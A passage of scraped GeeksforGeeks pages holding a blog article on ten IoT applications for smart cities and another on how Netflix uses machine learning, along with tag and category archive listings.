≤ i ≤ N, 1 ≤… Read More » GreedyMathematicalTechnical ScripterNumbersTechnical Scripter 2020 Page 1 of 4912345...102030...»Last » Most popular in Technical Scripter 2020 ToDo App in C Language14 Most Common Network Protocols And Their VulnerabilitiesCRUD Operations in MySQLPull to Refresh with RecyclerView in Android with ExampleRecyclerView as Staggered Grid in Android With Example Most visited in Technical Scripter 2020 Difference Between Golang and DartOpen Applications using PythonWhich Data Type Cannot be Stored in Java ArrayList?Create a Snake-Game using Turtle in PythonHow to pass data into a bootstrap modal? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

10 Applications of IoT in Creating Smart Cities - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Socket Programming in C/C++GET and POST requests using PythonTop 10 Projects For Beginners To Practice HTML and CSS SkillsFast I/O for Competitive ProgrammingOOPs | Object Oriented DesignDifferences between Procedural and Object Oriented ProgrammingWorking with csv files in PythonSupervised and Unsupervised learningXML parsing in PythonGet Your Dream Job With Amazon SDE Test SeriesTypes of Software TestingDifference between FAT32, exFAT, and NTFS File SystemWorking with PDF files in PythonHow to overcome Time Limit Exceed(TLE)?Web 1.0, Web 2.0 and Web 3.0 with their differenceHow Content Writing at GeeksforGeeks works?Twitter Sentiment Analysis using PythonGATE CS 2021 (Revised) SyllabusTechnical Scripter Event 2020 By GeeksforGeeksGetting started with Machine LearningFrontend vs BackendWhat happens when we turn on computer?7 Best Coding Challenge Websites in 2020Socket Programming in C/C++: Handling multiple clients on server without multi threadingImplementing Web Scraping in Python with BeautifulSoupIntroduction to Hill Climbing | Artificial IntelligenceHow to include graphics.h in CodeBlocks?Writing a Windows batch scriptRegression and Classification | Supervised Machine LearningHow can one become good at Data structures and Algorithms easily? 10 Applications of IoT in Creating Smart Cities Last Updated: 19-12-2020 For most of the people reading this article, chances are that you live in a city. In fact, more than 55% of all the people in the world live in cities and urban areas, a number which may increase to 70% in the future as urbanization increases and people migrate to the cities in search of jobs. But this means that cities need better planning and infrastructure if they have to be energy efficient and environmentally friendly to provide a good quality of life. In other words, cities need to become smart cities! This is possible using a combination of the Internet of Things with sensors collecting data and machine learning implementing the insights obtained from the data. IoT can be used in many ways to make cities more efficient ranging from managing the traffic, controlling air pollution, handling waste management, creating smart buildings, planning for natural disasters, etc. So let’s see how modern technologies combined with civic planning can result in smart cities that are more efficient and cost-effective. 1. Traffic Management It is important to control the traffic in cities otherwise there are huge traffic jams in popular places and totally empty streets otherwise. This also depends on the design and layout of the roads but it can be managed by having smart traffic lights. For example, the traffic lights should automatically adjust according to the volume of the traffic so that green lights should have a longer duration where there more traffic and shorter duration when the streets are empty. Sensors can also be embedded in roads and bridges to monitor their conditions so that they can be repaired when there is much wear and tear. After all, roads with potholes are also a major cause of traffic pollution! 2. Air Pollution Air pollution is a major problem in many metropolitan cities where the particulate matter in the air is so high it is damaging to the lungs in the long run. But IoT along with machine learning can be used to reduce air pollution. This is possible by collecting data related to city pollution like emissions from vehicles, pollen levels, airflow direction, weather, traffic levels, etc using IoT from various sources and then calculating pollution forecasts to see the trends in pollution so they can be controlled. 3. Healthcare Healthcare is an extremely important aspect of life, especially in current times when non-communicable diseases like heart problems and cancer are increasing in big cities while there are still a lot of deaths from infectious diseases in poorer places. In such a situation, IoT technology can surely help in enhancing the healthcare system so that the best healthcare is received by everybody. One example of this is microbots that can directly enter the bloodstream and reach any place inside the body to deliver medicines. Another application of IoT and sensors in healthcare is remote patient monitoring wherein patients can be monitored 24/7 and emergency responders called if there are any problems. 4. Public Transport Public transport, whether it be buses or trains, are at the heart of any city. This is especially true in big cities where there are big traffic jams and the metro train can be a lifesaver! However, smart public transport can streamline traffic and also make commuters’ life much easier. It is very convenient when the trains and buses are connected with a single app and you know exactly when the next service will arrive and how long you need to wait. In addition to that, predictive analytics can be used to optimize the routes of public transport which provide maximum benefit and minimum cost. 5. Water Management There is no life without water! But water is also a finite resource which is reducing at an alarming rate. Therefore, using smart water management techniques in cities so that water can be conserved for future generations is a good idea. Sensors can be used to monitor water levels, pipe conditions, tank pressures, etc. in municipal water pipelines and tanks to optimize water management. These will ensure that water is not wasted and that problems like leaky pipes or high pressure in tanks can be handled without any loss of water. Sensors can also be used to monitor the groundwater levels so that they can be replenished if there is a groundwater shortage. 6.Buildings Cities are obviously incomplete without buildings and larger cities have a lot of skyscrapers as well. Now the challenge is to build smart buildings using IoT where all the functionalities like lighting, air conditioners, heating, security, etc. can be connected and controlled from a single source. This will reduce the costs of operating a building as well as increase efficiency. For example, air conditions and heaters in a building can be set to change the internal temperature according to the outside temperature. Sensors can also be used to monitor the air quality inside the building and also automatically switch on lights only when there are people. All these actions will save a lot of energy and also reduce the electricity bill! 7. Waste Management Waste management systems in a city can be optimized so that there is efficient waste collection and disposal which helps in keeping the city clean and hygienic. After all, mismanagement of waste can lead to contamination of the soil, air, and water as well as provide a breeding ground for a host of bacteria (not to mention the horrible smell!) But IoT technology with sensors in the waste bins can be used to find when the bins are full and dispose of them accordingly. This is better than just disposing the waste on particular days only when the bind might not be full sometimes or overflowing with the danger of contamination on other days. 8. Parking It doesn’t sound like parking is a problem but it is actually a big headache, especially in large cities. Less available space means that drivers have to waste their time finding parking spaces and increase road traffic in this process ( while also becoming more and more irritated!) This issue can be solved by using IoT connected sensors around the city that point out the empty parking spaces around wherever your destination is. This data will also allow city officials to see where there is congestion due to less parking space and where there is lots of empty space available. This can then be used to optimize parking and prevent traffic jams as well as driver irritation! 9. Natural Disaster Management It is not possible to prevent natural disasters like hurricanes, earthquakes, tsunamis, etc. but it is entirely possible to anticipate these disasters before they occur and then manage them effectively. For example, sensors in combination with IoT can be used to anticipate when earthquakes are going to occur by analyzing the makeup of the ground, seismic plate interaction, energy propagation in the ground, etc. Similarly, sensors can be used to obtain flood detection data like river level readings, rainfall records, terrain and elevation of an area, etc. to predict when and where a flood might occur and the severity of the flood as well. 10. Infrastructure The infrastructure of a city i.e. its roads, buildings, etc are essentially what form the city. And smart infrastructure is a very important part of creating a smart city. This includes using IoT along with sensors to use technology intelligently which can save energy and cost for a city. An example of this is using smart streetlights along the roads that only turn on when they detect motion and stay off the rest of the time. This will definitely save energy and reduce the cost to the city. Conclusion These are only some of the applications of IoT in creating smart cities. There are many more options that can be explored to make cities a better option for more than 70% of the world’s population in the future. Many of these applications are already used in the big metropolitan cities around the world, however, there are many barriers to creating truly smart cities. Some of these may be bureaucracy or the fact that it takes time to integrate the existing systems with new technology. Whatever the reason, there is no doubt that the future is smart! My Personal Notes arrow_drop_up Save Recommended Posts:Why are Smart Cities Most Vulnerable to Cyber Security Risks?Edge Computing – A Building Block for Smart Applications of the FutureBlockchain | Smart ContractsWorking and Types of Smart CardDo You Know That Google’s Latest Phone is Not a Smart Phone?13 Study Tips For Students - Smart Work is the Key of SuccessAll About Smart India Hackathon (SIH) 2020 - Software EditionInternet of Things (IoT) | Set 3Internet of Things (IoT) | Set 2Introduction to Internet of Things (IoT) | Set 1Impact of IoT on CyberSecurityCombining IoT and Machine Learning makes our future smarterChallenges in World Of IoTBenefit Of IoT in Healthcare SectorComplementary Relationship Between Cloud Computing and IOTIoT- Recreating HealthcareSecurity Threats to IoT DevicesBenefits of IoT for transportation sector4 Industries That Will Continue To Be Reshaped By IoT In The 2020s7 Steps to Getting Started With IoTharkiran78Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : GBlogIoT thumb_up Be the First to upvote. To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page How Does Netflix Use Machine Learning? Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Virtualization | A Machine Reference ModelGenetic AlgorithmsUnderfitting and Overfitting in Machine Learning More related articles in GBlog Top 5 IDEs for C++ That You Should Try OnceVirtualization In Cloud Computing and TypesTop 10 System Design Interview Questions and AnswersEthical Issues in Information Technology (IT)Difference between Structured, Semi-structured and Unstructured data room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

IoT Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introduction to Internet of Things (IoT) | Set 1Difference between IoT and M2M7 Best Languages to Learn IoT Development in 2020Difference between MQTT and HTTP protocolsTop Programming Languages for Internet of ThingsDifference between Rest API and Web Socket APIDifference Between Internet of Things and Artificial IntelligenceWorld Of IoT BoardsDifference between AMQP and HTTP protocolsChallenges Faced By IoT in Agricultural SectorComponents of IOT and relation with Cloud ComputingUnderstanding "Things" in Internet of ThingsDifference between IIOT and IOTSustainable development with 5G/IOTHow Blockchain Technology Can Accelerate the Potential of IoT?10 Applications of IoT in Creating Smart CitiesIOT as a key in Digital Health Care SystemMost Common Threats to Security and Privacy of IoT DevicesTrust Based Energy-Efficient and Secure Routing Protocols for IoT10 Security Tips for IoT DevicesBlockchain of Things (BoT)Benefits of Internet of Things(IoT) in Manufacturing IndustryDifferent Ways to Prepare an IT Network for IoT Tag Archives: IoT 10 Applications of IoT in Creating Smart Cities Last Updated: 19-12-2020 For most of the people reading this article, chances are that you live in a city. In fact, more than 55% of all the people… Read More » GBlogIoT Blockchain of Things (BoT) Last Updated: 23-11-2020 Blockchain Technology is a technology in which records, also known as the block, of the public in several databases, known as the “chain,” in a… Read More » MiscBlockChainIoT Most Common Threats to Security and Privacy of IoT Devices Last Updated: 14-10-2020 Nowadays, the Internet is growing at a very fast rate with the advancement in technologies and techniques. Some years ago, we did not necessarily require… Read More » GBlogIoT Difference between Rest API and Web Socket API Last Updated: 13-10-2020 In IoT, there are 2 communication APIs – REST Based Communication APIs Web Socket Based Communication APIs Web service can either be implemented using REST… Read More » Computer NetworksDifference BetweenIoT Understanding “Things” in Internet of Things Last Updated: 06-10-2020 Nowadays, Internet of Things (IoT) has become one of the most powerful technologies of modern era having the internet as its backbone. Internet of Things… Read More » Computer NetworksIoT Top Programming Languages for Internet of Things Last Updated: 17-09-2020 Years back, we had never imagined that the day will come when we will just come near to our door and it will automatically open,… Read More » GBlogIoT 7 Best Languages to Learn IoT Development in 2020 Last Updated: 12-09-2020 Have you ever thought of building a single application to access & control all your home applications or a device that can help you to… Read More » GBlogIoT Difference between AMQP and HTTP protocols Last Updated: 16-07-2020 1. AMQP : AMQP is an acronym used for the Advanced Message Queuing Protocol. It is a protocol that is used for communication between applications.… Read More » Computer NetworksDifference BetweenIoT Difference between MQTT and HTTP protocols Last Updated: 06-07-2020 1. Message Queuing Telemetry Transport (MQTT) : It was created by Andy Standford-Clark and Arlen Nipper. It is an IoT interaction protocol based on the… Read More » Computer NetworksDifference BetweenIoT Difference between IIOT and IOT Last Updated: 09-07-2020 1. Industrial Internet of Things (IIOT) : It is network of smart devices that has its own computing capability, which are connected to form systems… Read More » Computer NetworksDifference BetweenIoT Trust Based Energy-Efficient and Secure Routing Protocols for IoT Last Updated: 09-07-2020 There are many network designs and Internet of Things (IoT) models (devices) that are at work presently, but these lack either in terms of energy… Read More » Computer NetworksWrite From HomeIoT IOT as a key in Digital Health Care System Last Updated: 05-06-2020 Internet of Things (IoT) has already touched every aspect our life and has already shown its’ presence in most of the working sectors. Now use… Read More » Computer NetworksGBlogIoT World Of IoT Boards Last Updated: 05-06-2020 1 Since the concept of a smart city was introduced, IoT has been considered the key infrastructure. Internet of Things (IoT), a new era of computing… Read More » Computer SubjectIoT Sustainable development with 5G/IOT Last Updated: 29-05-2020 1.5 5G wireless technology is finally becoming a reality. It will provide higher multi-Gbps peak data speeds, better reliability than its preceding generations, unimaginably low latency,… Read More » Computer NetworksGBlogIoTWeb technologies 10 Security Tips for IoT Devices Last Updated: 02-06-2020 With the increasing technology in today’s world the use of IoT devices is preferred the most. IoT device is also called the double-edged sword. Along… Read More » GBlogTechTipsIoT Page 1 of 212» Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonTop 5 IDEs for C++ That You Should Try OnceHow to send an email from JavaScript ?How To Create a Countdown Timer Using Python?How to find index of a given element in a Vector in C++ room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

How Does Netflix Use Machine Learning? - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Socket Programming in C/C++GET and POST requests using PythonTop 10 Projects For Beginners To Practice HTML and CSS SkillsFast I/O for Competitive ProgrammingOOPs | Object Oriented DesignDifferences between Procedural and Object Oriented ProgrammingWorking with csv files in PythonSupervised and Unsupervised learningXML parsing in PythonGet Your Dream Job With Amazon SDE Test SeriesTypes of Software TestingDifference between FAT32, exFAT, and NTFS File SystemWorking with PDF files in PythonHow to overcome Time Limit Exceed(TLE)?Web 1.0, Web 2.0 and Web 3.0 with their differenceHow Content Writing at GeeksforGeeks works?Twitter Sentiment Analysis using PythonGATE CS 2021 (Revised) SyllabusTechnical Scripter Event 2020 By GeeksforGeeksGetting started with Machine LearningFrontend vs BackendWhat happens when we turn on computer?7 Best Coding Challenge Websites in 2020Socket Programming in C/C++: Handling multiple clients on server without multi threadingImplementing Web Scraping in Python with BeautifulSoupIntroduction to Hill Climbing | Artificial IntelligenceHow to include graphics.h in CodeBlocks?Writing a Windows batch scriptRegression and Classification | Supervised Machine LearningHow can one become good at Data structures and Algorithms easily? How Does Netflix Use Machine Learning? Last Updated: 19-12-2020 What do you do when you want to watch the latest movies or series? Chances are you open Netflix of course! Whether you want to check out the latest season of the Crown or binge-watch all the seasons of Friends, everything is possible on Netflix. There is such a wide variety of shows and movies that everyone can find something they like. But when there are more than 14,000 options, how do you choose something to watch? Well, machine learning can be a big help in that. There are many applications of Machine Learning used by Netflix among which the most popular is their content recommendation system that tells you what you might like. But that’s not all! Netflix uses machine learning in almost all the facets of its working to provide a seamless experience for users. After all, the data collected by Netflix is huge which includes both the explicit data such as thumbs up or thumbs down for a movie and even implicit data such as data and location where users watch a particular content, the time they watch it for, what device they use, whether they binge-watch it or not, their content choices, online behavior, etc. All this data can be used for machine learning that ultimately improves the bottom line i.e. gets more subscribers for Netflix! So let’s check out the different ways Netflix uses Machine Learning. 1. Content Recommendations Go to Netflix and check your movie recommendations! Are they the same as your friends? No, your movie recommendations are totally personalized to your tastes and based on what you might want to want. So if you are a fan of horror movies, you might see more of the Witchy and Ghostly options while your fiend may see cute love story options if they are a fan of rom-coms. But how does Netflix decide this? They use their recommendations system that is based on a machine-learning algorithm that takes into account your past choices in movies, the types of genres you like, and what moves were watched by users that had similar tastes like yours. This movie recommendation algorithm is very important for Netflix, as they have thousands of options of all types and users, are more likely to get confused in choosing what to watch next than actually watching anything. Here the movie recommendation algorithm can provide a clear guideline and help in what to watch. And it’s your choice to follow it or not. If you are in the mood for watching Silence of the Lambs after Pride and Prejudice, then go for it! 2. Auto-generated Thumbnails Thumbnails can make a lot of difference in whether a user will watch a movie or not. Just imagine you are browsing through Netflix and you see a very interesting thumbnail for a movie or series you’ve never watched. You will definitely click on the thumbnail and check out that movie (whether you light it or not is a different matter!) So the images on the thumbnail can make a big difference for the traffic to a particular movie or series for Netflix. That is why they have personalized auto-generated thumbnail images that are created according to the individual user’s tastes in movies. Netflix uses machine learning to analyze your movie and series choices and understand what sort of thumbnail you are most likely to click. For example, the series Riverdale can have two different thumbnails, a sweet romantic version or a serious mystery version and you will see the one depending on your tastes. While Riverdale has both these aspects, the thumbnail according to your preferences will push you in at least checking out these series, and then you can decide if you want to stick or not! 3. Streaming Quality What the worst thing that can happen when you are watching a movie? It’s buffering of course! Buffering or low video quality takes you out of the movie totally and is very irritating. Netflix knows this, and they have tried their hardest to ensure that there is no buffering or loss of streaming quality when viewers are watching movies or shows. After all, those things can be killer and result in people switching to rival services like Amazon Prime or Hulu. But how does Netflix ensure the best streaming quality so that there are no glitches even during peak times? It cannot be easy since they have around 200 million subscribers all over the world. Netflix uses machine learning algorithms to predict the viewer patterns and understand when there will be general increases and decreases in viewers of spikes in viewing a certain movie or show. Then they can cache the regional servers that are much closer to the viewers so that there is no log in streaming or loading times even during peak popularity periods. 4. Locations for Shooting Netflix is not just a streaming platform that showcases different movies and series. It is also a production company that creates and produces many fantastic movies and series! If you are interested, then check out Delhi Crime, Orange is the new Black, The Crown, Queen’s Gambit, etc. which are all Netflix originals (and pretty good)! Anyway, Netflix needs to decide on the locations of shooting all these movies and series. Thee are many factors in choosing a particular location such as the cost and budget factors, scheduling conflicts for actors and crew, specific shooting requirements (like a desert, or coastal city, or night-time shooting), weather situation for a location, the possibility of gaining the permits from the local administration, etc. All these factors need to be considered by the production team before deciding on a location and machine learning can be a big help in this. A machine learning algorithm can be used to find a list of optimal locations in the world based on all the constraints that need to be satisfied. 5. Content Quality Why is Netflix so popular? That’s because it’s not just a streaming platform but also an experience for all its users. The beautiful user interface, the personalized recommendations, the variety of subtitle options in each language, the creative original productions, all of these make Netflix what it is! Just think, would you be addicted to Netflix if their quality were not so good? No. That’s why managing content quality is such an important part of Netflix. And they use Machine Learning for this as well! Netflix has created a supervised quality control algorithm that passes or fails the content such as audio, video, subtitle text, etc. based on the data it was trained on. If any content is failed, then it is further checked by manually quality control to ensure that only the best quality reached the users. After all, you probably wouldn’t watch Stranger Things on Netflix if the subtitles were wrong or the audio was lagging behind the video. Conclusion As you can see, there are many ways in which Netflix uses Machine Learning. All you see on the site, including your main page and even the recommendations, are all personalized according to your tastes. And this is just the starting! All the facets of your user experience including the seamless video quality, thumbnails you see, the subtitle and audio quality, etc. have some part of machine learning. So the next time you are watching Stranger Things on Netflix, remember that you are not just watching a series but a blending of entertainment and cutting edge technology to provide you this experience. My Personal Notes arrow_drop_up Save Recommended Posts:How Does Google Use Machine Learning?How Does NASA Use Machine Learning?The Story of Netflix and MicroservicesLearning Model Building in Scikit-learn : A Python Machine Learning LibraryArtificial intelligence vs Machine Learning vs Deep LearningHow to Start Learning Machine Learning?Difference Between Artificial Intelligence vs Machine Learning vs Deep LearningDifference Between Machine Learning and Deep LearningNeed of Data Structures and Algorithms for Deep Learning and Machine LearningAzure Virtual Machine for Machine LearningWhat does it mean for a Machine to Think?ML | Types of Learning – Supervised LearningIntroduction to Multi-Task Learning(MTL) for Deep LearningLearning to learn Artificial Intelligence | An overview of Meta-LearningML | Reinforcement Learning Algorithm : Python Implementation using Q-learningMachine Learning - ApplicationsDemystifying Machine LearningGetting started with Machine LearningIntroduction To Machine Learning using PythonAn introduction to Machine Learningharkiran78Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : GBlogMachine Learning Practice Tags : Machine Learning thumb_up 1 To-do Done 0 No votes yet. Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page 7 Key Tips to Crack the GATE Exam in First Attempt Next last_page 10 Applications of IoT in Creating Smart Cities Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in GBlog 100 Days of Code - A Complete Guide For Beginners and ExperiencedWhy Java Language is Slower Than CPP for Competitive Programming?Virtualization | A Machine Reference ModelGenetic AlgorithmsUnderfitting and Overfitting in Machine Learning Most visited in Machine Learning Search Algorithms in AINaive Bayes ClassifiersCrossover in Genetic AlgorithmAgents in Artificial IntelligenceReinforcement learning room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Machine Learning Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Removing stop words with NLTK in PythonNaive Bayes ClassifiersSupervised and Unsupervised learningAgents in Artificial IntelligenceConfusion Matrix in Machine LearningReinforcement learningDecision TreeSearch Algorithms in AIGetting started with Machine LearningDecision tree implementation using PythonDecision Tree Introduction with exampleActivation functions in Neural NetworksIntroduction to Hill Climbing | Artificial IntelligenceML | One Hot Encoding of datasets in PythonRunning Python script on GPU.Regression and Classification | Supervised Machine LearningPython | Lemmatization with NLTKK means Clustering - IntroductionBest Python libraries for Machine LearningConvert Text to Speech in PythonNull Space and Nullity of a MatrixML | Linear RegressionElbow Method for optimal value of k in KMeansClustering in Machine LearningUnderstanding Logistic RegressionK-Nearest NeighboursUnderfitting and Overfitting in Machine LearningAssociation RuleDifference between Machine learning and Artificial IntelligencePython | Implementation of Polynomial Regression Category Archives: Machine Learning How Does Netflix Use Machine Learning? Last Updated: 19-12-2020 What do you do when you want to watch the latest movies or series? Chances are you 